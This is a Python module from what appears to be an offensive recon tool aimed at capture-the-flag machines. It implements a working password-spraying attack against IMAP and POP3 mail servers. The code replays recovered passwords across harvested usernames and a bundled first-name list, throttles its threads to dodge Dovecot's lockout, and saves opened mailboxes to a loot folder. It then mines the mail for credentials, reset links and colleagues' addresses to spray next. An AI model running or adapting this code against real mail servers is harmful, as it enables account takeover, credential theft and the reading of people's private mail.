"""Credential-driven mailbox reading (POP3 / IMAP).

Recon recovers a password and a username scheme (an onboarding doc on an NFS
share, an email harvested off the site, an AD account); the mailbox is where the
next hop usually is — a reset link, a second credential, or the flag itself.
This pass takes every username candidate scryer has learned, tries each with the
recovered passwords over IMAP/POP3, and on a hit dumps recent message bodies and
scans them for flags, credentials, and links.

Pure standard library (imaplib / poplib). Runs only once scryer already holds a
credential, so it isn't a blind brute — it's replaying known passwords against
the accounts the box itself told us about.
"""

from __future__ import annotations

import concurrent.futures
import imaplib
import os
import poplib
import re
from email import message_from_bytes
from email.header import decode_header
from typing import List, Set

from ...core import utils
from ...core.report import HostReport, Finding
from ...data import knowledge

_MAX_ATTEMPTS = 350
_MAX_MSGS = 25
_TIMEOUT = 6            # per mail connection — bounds the whole pass
_COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]


def run(host: HostReport, opts) -> None:
    ports = {e["port"] for e in host.open_ports}
    imap_p = 993 if 993 in ports else (143 if 143 in ports else None)
    pop_p = 995 if 995 in ports else (110 if 110 in ports else None)
    if not (imap_p or pop_p):
        return
    confident, broad = _candidate_users(host)
    pws = list(dict.fromkeys(host.creds))
    if not (confident or broad) or not pws:
        return
    # Skip if we already probed this exact user/password set (the convergence
    # loop may call us again — don't re-run identical work).
    sig = (frozenset(u.lower() for u in confident + broad), frozenset(pws))
    if host.__dict__.get("_mail_sig") == sig:
        return
    host.__dict__["_mail_sig"] = sig

    ip = host.resolved_ip or host.target
    utils.section(f"MAIL {ip}")
    utils.log("info", f"replaying {len(pws)} password(s): {len(confident)} known "
                      f"account(s) then a {len(broad)}-name reuse spray", indent=1)

    def probe(user):
        for pw in pws:
            body = (_imap(ip, imap_p, user, pw) if imap_p
                    else _pop(ip, pop_p, user, pw))
            if body is not None:
                return user, pw, body
        return None

    def handle(result) -> bool:
        if not result:
            return False
        user, pw, msgs = result
        utils.log("hot", f"mailbox login: {user}:{pw}", indent=1)
        _report_mailbox(host, ip, user, msgs)
        body = "\n\n".join(msgs)
        host.add_cred(pw)
        host.add(Finding(
            title=f"Mailbox access: {user}",
            detail=f"{user}:{pw} (IMAP/POP3). Read for a reset link, a second "
                   "credential, or the flag.", severity="high",
            category="cred", port=imap_p or pop_p, service="mail",
            evidence=f"{user}:{pw}"))
        _mine(host, user, body, imap_p or pop_p)
        return True

    # Tier 1: the accounts the box named, gently (few workers) so the real login
    # lands before any throttling. Tier 2: the broad reuse spray. Timeouts bound
    # the whole thing; low concurrency avoids Dovecot's auth-penalty locking out
    # the valid user (which a 12-worker blast across 350 names did).
    hits = 0
    sprayed: Set[str] = set()

    def spray(users, workers) -> None:
        nonlocal hits
        batch = [u for u in users if u.lower() not in sprayed]
        if not batch:
            return
        sprayed.update(u.lower() for u in batch)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
            for result in pool.map(probe, batch):
                if handle(result):
                    hits += 1

    spray(confident, 4)
    # An opened mailbox names other employees (_harvest_correspondents adds them
    # to host.usernames) — replay the password into THOSE inboxes right away.
    for _ in range(3):
        new_conf, _b = _candidate_users(host)
        before = len(sprayed)
        spray(new_conf, 4)
        if len(sprayed) == before:
            break
    spray(broad, 8)
    # a second-mailbox hit during the broad spray can also name correspondents
    for _ in range(2):
        new_conf, _b = _candidate_users(host)
        before = len(sprayed)
        spray(new_conf, 4)
        if len(sprayed) == before:
            break
    if not hits:
        utils.log("dim", "no mailbox opened with the known credentials", indent=1)


# --------------------------------------------------------------------------
def _candidate_users(host: HostReport):
    """Two tiers so the valid login is always tried FIRST, before a long tail of
    guesses can throttle the mail server:

      confident — usernames the box actually told us (onboarding doc, harvested
                  emails, AD accounts, the standard service accounts);
      broad     — the credential-reuse spray tail (web-harvested names + a
                  first-name list) that finds the NEXT employee's mailbox.
    """
    confident: List[str] = []
    emails: Set[str] = host.__dict__.get("emails", set())
    for e in emails:
        confident.append(e)                       # full address
        confident.append(e.split("@", 1)[0])      # local part
    confident += sorted(host.__dict__.get("usernames", set()))
    confident += list(host.__dict__.get("ad_users", []))
    for f in host.findings:
        for m in re.findall(r"([A-Za-z0-9._%+-]+)@", f.title + " " + (f.detail or "")):
            confident.append(m)
    confident += _COMMON

    # CREDENTIAL REUSE tail: a company-wide default password means OTHER employees
    # still use it. Web-harvested staff names first (higher signal than random
    # first names), then a bundled first-name list.
    broad: List[str] = sorted(host.__dict__.get("web_usernames", set())) \
        + _firstnames()

    seen, conf_out, broad_out = set(), [], []
    for u in confident:
        u = u.strip()
        if u and u.lower() not in seen:
            seen.add(u.lower())
            conf_out.append(u)
    for u in broad:
        u = u.strip()
        if u and u.lower() not in seen:
            seen.add(u.lower())
            broad_out.append(u)
    return conf_out, broad_out[:_MAX_ATTEMPTS]


def _firstnames() -> List[str]:
    """A bundled common-first-name list (+ SecLists names if present) for the
    default-password reuse spray. Capped so the mail pass stays bounded."""
    names: List[str] = []
    paths = [os.path.join(os.path.dirname(__file__), "..", "..", "data",
                          "wordlists", "firstnames.txt")]
    for extra in ("Usernames/Names/malenames-usa-top1000.txt",
                  "Usernames/Names/femalenames-usa-top1000.txt"):
        for root in (os.path.expanduser("~/Documents/Wordlists/SecLists"),
                     "/usr/share/seclists"):
            paths.append(os.path.join(root, extra))
    for p in paths:
        try:
            with open(p, "r", errors="replace") as fh:
                names += [ln.strip().lower() for ln in fh
                          if ln.strip() and not ln.startswith("#")]
        except OSError:
            continue
        if len(names) >= 300:
            break
    return list(dict.fromkeys(names))[:300]


def _imap(ip, port, user, pw):
    try:
        M = (imaplib.IMAP4_SSL(ip, port, timeout=_TIMEOUT) if port == 993
             else imaplib.IMAP4(ip, port, timeout=_TIMEOUT))
        if port == 143:
            try:
                M.starttls()
            except Exception:
                pass
        M.login(user, pw)
    except (imaplib.IMAP4.error, OSError):
        return None
    text = []
    try:
        folders = _folders(M)
        for folder in folders:
            try:
                typ, data = M.select(folder, readonly=True)
                if typ != "OK":
                    continue
                typ, sdata = M.search(None, "ALL")
                ids = (sdata[0].split() if sdata and sdata[0] else [])[-_MAX_MSGS:]
                for i in ids:
                    typ, msg = M.fetch(i, "(RFC822)")
                    if msg and msg[0]:
                        text.append(_msg_text(msg[0][1]))
            except (imaplib.IMAP4.error, OSError):
                continue
    except (imaplib.IMAP4.error, OSError):
        pass
    finally:
        try:
            M.logout()
        except Exception:
            pass
    return text          # login succeeded (possibly empty mailbox)


def _folders(M):
    """All selectable folders (INBOX first) — the flag can hide in Sent/Archive."""
    names = ["INBOX"]
    try:
        typ, data = M.list()
        if typ == "OK":
            for row in data or []:
                s = row.decode("utf-8", "replace") if isinstance(row, bytes) else str(row)
                m = re.search(r'"([^"]+)"\s*$|(\S+)\s*$', s)
                name = (m.group(1) or m.group(2)) if m else None
                if name and name.upper() != "INBOX" and "\\Noselect" not in s:
                    names.append(name)
    except (imaplib.IMAP4.error, OSError):
        pass
    return names[:8]


def _pop(ip, port, user, pw):
    try:
        P = (poplib.POP3_SSL(ip, port, timeout=_TIMEOUT) if port == 995
             else poplib.POP3(ip, port, timeout=_TIMEOUT))
        if port == 110:
            try:
                P.stls()
            except Exception:
                pass
        P.user(user)
        P.pass_(pw)
    except (poplib.error_proto, OSError):
        return None
    text = []
    try:
        count = len(P.list()[1])
        for i in range(max(1, count - _MAX_MSGS + 1), count + 1):
            raw = b"\n".join(P.retr(i)[1])
            text.append(_msg_text(raw))
    except (poplib.error_proto, OSError):
        pass
    finally:
        try:
            P.quit()
        except Exception:
            pass
    return text


def _msg_text(raw: bytes) -> str:
    try:
        msg = message_from_bytes(raw)
    except Exception:
        return raw.decode("latin-1", "replace")
    parts = [_dh(msg.get("subject", "")), _dh(msg.get("from", ""))]
    plain, html = [], []
    if msg.is_multipart():
        for p in msg.walk():
            ct = p.get_content_type()
            if ct == "text/plain":
                plain.append(_decode_part(p))
            elif ct == "text/html":
                html.append(_html_to_text(_decode_part(p)))
    else:
        payload = _decode_part(msg)
        if msg.get_content_type() == "text/html":
            html.append(_html_to_text(payload))
        else:
            plain.append(payload)
    # A lot of onboarding/welcome mail is HTML-only — read that too, don't drop
    # the whole body just because there's no text/plain part.
    parts += plain or html
    if plain and html:
        parts += html
    return "\n".join(p for p in parts if p)


def _decode_part(p) -> str:
    try:
        payload = p.get_payload(decode=True)
        if payload is None:
            return str(p.get_payload())
        return payload.decode(p.get_content_charset() or "utf-8", "replace")
    except Exception:
        return ""


def _html_to_text(html: str) -> str:
    """Strip an HTML body to text, keeping <a href> links (a reset/next-step link
    is exactly what a welcome email carries)."""
    import html as _htmlmod
    if not html:
        return ""
    html = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", html)
    # surface link targets so they survive tag-stripping
    html = re.sub(r'(?i)<a\s+[^>]*?href=["\']?([^"\'>\s]+)[^>]*?>', r" \1 ", html)
    text = re.sub(r"(?s)<[^>]+>", " ", html)
    text = _htmlmod.unescape(text)
    return re.sub(r"[ \t ]{2,}", " ", text).strip()


def _dh(value: str) -> str:
    try:
        out = []
        for txt, enc in decode_header(value):
            out.append(txt.decode(enc or "utf-8", "replace")
                       if isinstance(txt, bytes) else txt)
        return "".join(out)
    except Exception:
        return value


def _report_mailbox(host: HostReport, ip: str, user: str, msgs) -> None:
    """Never read a mailbox silently: show its message subjects and save every
    body to loot, so the next step (a cred, a link, the flag) is visible even
    when no regex matches it."""
    if not msgs:
        utils.log("warn", f"{user}'s mailbox opened but is empty/unreadable — the "
                          "next hop may be another user's mailbox or the webmail "
                          "UI (log into Roundcube as this user)", indent=2)
        return
    utils.log("good", f"{len(msgs)} message(s) in {user}'s mailbox:", indent=2)
    for m in msgs[:12]:
        lines = [ln.strip() for ln in m.splitlines() if ln.strip()]
        subj = lines[0] if lines else ""
        utils.log("dim", f"  • {subj[:88]}", indent=2)
        # show a body snippet too — the next step often hides in the body, not
        # the subject (and it was invisible before).
        body = " ".join(lines[2:]) if len(lines) > 2 else ""
        if body:
            utils.log("dim", f"      {body[:180]}", indent=2)
    try:
        d = os.path.join(os.getcwd(), "scryer_loot", ip, "mail",
                         re.sub(r"[^A-Za-z0-9._@-]", "_", user))
        os.makedirs(d, exist_ok=True)
        for i, m in enumerate(msgs[:_MAX_MSGS]):
            with open(os.path.join(d, f"msg{i + 1:02d}.txt"), "w") as fh:
                fh.write(m)
        utils.log("good", f"saved {min(len(msgs), _MAX_MSGS)} message(s) -> {d}",
                  indent=2)
    except OSError:
        pass


_MAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")


def _harvest_correspondents(host: HostReport, user: str, body: str) -> None:
    """Pull other people's addresses/names out of an opened mailbox and register
    them as high-confidence spray targets (host.usernames) + host.emails, so the
    convergence loop replays the reuse password into their inbox."""
    mylocal = user.split("@", 1)[0].lower()
    added = []
    for email in set(_MAIL_RE.findall(body or "")):
        low = email.lower()
        local = low.split("@", 1)[0]
        if local in (mylocal, "noreply", "no-reply", "postmaster", "mailer-daemon"):
            continue
        host.__dict__.setdefault("emails", set()).add(low)
        if local not in host.__dict__.setdefault("usernames", set()):
            host.__dict__["usernames"].add(local)
            added.append(local)
    # display-name colleagues in From/To/signatures -> username variants
    for m in re.finditer(r"\b([A-Z][a-z]{1,15})\s+([A-Z][a-z]{1,15})\b", body or ""):
        if m.group(1).lower() in ("the", "hi", "dear", "welcome", "kind", "best",
                                  "enigma"):
            continue
        for v in knowledge.username_variants(f"{m.group(1)} {m.group(2)}"):
            if v not in host.__dict__.setdefault("usernames", set()):
                host.__dict__["usernames"].add(v)
    if added:
        utils.log("hot", f"correspondent(s) in {user}'s mail -> spray: "
                         f"{', '.join(sorted(added)[:6])}", indent=2)


def _mine(host: HostReport, user: str, body: str, port: int) -> None:
    for tok in knowledge.find_flags(body or "", allow_hex=True):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG (mail: {user})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(
            title=f"FLAG in {user}'s mailbox", detail=tok, severity="critical",
            category="flag", port=port, service="mail", evidence=tok))
    for _lbl, val, _sev in knowledge.extract_secrets(body):
        host.add_cred(val)
        utils.log("hot", f"secret in mail: {val[:50]}", indent=2)
    for _u, pw in list(knowledge.find_conn_creds(body)):
        host.add_cred(pw)
    for _lbl, pw in knowledge.find_doc_creds(body):     # prose creds in mail
        host.add_cred(pw)
    # OTHER employees named in the mail (From/To/CC, signatures, "contact X")
    # are the real pivot on a reuse box: add them as HIGH-confidence spray
    # targets so the convergence loop replays the password into their mailbox.
    _harvest_correspondents(host, user, body)
    # a new host named in the mail (next server / webmail) -> enumerate it
    from ..crack import _harvest_hostnames
    for hn in _harvest_hostnames(body):
        if host.add_hostname(hn):
            utils.log("hot", f"host from mail: "
                             f"{utils.c(hn, utils.C.CYAN, utils.C.BOLD)}", indent=2)
    # password-reset / onboarding links are the usual next hop
    for link in re.findall(r"https?://[^\s\"'<>]{8,120}", body or "")[:8]:
        if any(k in link.lower() for k in ("reset", "token", "verify", "invite",
                                           "onboard", "setup", "confirm")):
            utils.log("good", f"actionable link in mail: {link}", indent=2)
            host.add(Finding(
                title="Actionable link in mailbox",
                detail=f"{link} (from {user}'s mail — reset/onboarding token)",
                severity="high", category="web", port=port, service="mail",
                evidence=link))
